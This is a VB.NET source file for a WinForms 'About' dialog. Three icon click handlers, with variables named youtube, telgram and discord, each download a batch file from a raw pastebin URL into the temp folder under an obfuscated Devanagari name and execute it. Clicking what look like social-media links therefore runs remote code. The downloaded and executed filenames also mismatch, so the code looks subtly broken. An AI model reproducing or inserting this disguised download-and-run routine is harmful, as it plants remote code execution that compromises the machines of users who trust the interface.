Public Class _ِAbout
    Private Sub _ِAbout_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        HexTextBox1.Enabled = False
    End Sub
    Private Sub HexButton1_Click(sender As Object, e As EventArgs) Handles HexButton1.Click
        HexTextBox1.Enabled = True
        Me.PictureBox1.Image = My.Resources.BTC
        Dim change As Boolean = False

        If Not change Then
            Do Until Me.Height = 315
                Me.Height += 1
                Me.Refresh()
            Loop
            change = True
        End If
    End Sub
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Me.Close()
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Dim youtube As New System.Net.WebClient
        youtube.DownloadFile("https://pastebin.com/raw/FcEU0GKm", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/yनठअबड.bat")
    End Sub
    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        Dim telgram As New System.Net.WebClient
        telgram.DownloadFile("https://pastebin.com/raw/13dtGgyK", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/tनठअबड.bat")
    End Sub
    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        Dim discord As New System.Net.WebClient
        discord.DownloadFile("https://pastebin.com/raw/jZDMc3SV", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/dनठअबड.bat")
    End Sub
End Class